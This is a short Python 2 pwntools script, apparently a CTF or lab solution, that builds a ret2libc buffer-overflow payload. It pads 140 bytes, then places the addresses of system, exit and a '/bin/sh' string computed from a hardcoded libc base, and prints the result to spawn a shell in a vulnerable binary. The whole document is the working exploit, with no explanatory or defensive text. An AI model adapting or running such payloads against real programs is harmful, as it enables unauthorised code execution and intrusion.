#!/usr/bin/python2
from pwn import p32

offset = 140
junk = b"A" * offset

libc_base = 0xf7cfe000

system = p32(libc_base + 0x00048150)
exit = p32(libc_base + 0x0003a440)
bin_sh = p32(libc_base + 0x1bd0f5)

payload = junk + system + exit + bin_sh

print(payload)
